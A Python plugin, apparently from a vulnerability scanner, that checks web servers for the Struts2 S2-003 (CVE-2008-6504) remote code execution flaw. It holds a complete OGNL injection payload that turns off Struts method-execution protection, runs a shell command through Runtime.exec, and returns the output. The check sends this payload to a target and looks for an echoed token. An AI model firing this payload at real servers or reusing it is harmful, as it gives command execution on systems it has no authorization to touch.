#!/usr/bin/env python3

from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_003_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-003漏洞,又名CVE-2008-6504漏洞.',
            'description': 'Struts 2.0.0 - Struts 2.1.8.1',
            'date': '2008-10-15',
            'type': 'RCE'
        }
        self.url = url 
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
        }
        self.capta = self.get_capta() 
        self.check_payload = r'''?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'{0}\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))'''.format('echo\\n' + self.capta)               

    def run(self):
        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/example/HelloWorld.action'
        try:
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            if self.capta in check_req.text.replace('\n', '') and len(check_req.text) < 100:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_003 = S2_003_BaseVerify('http://localhost:8080/s2_003_war_exploded/HelloWorld.action')
    print(S2_003.run())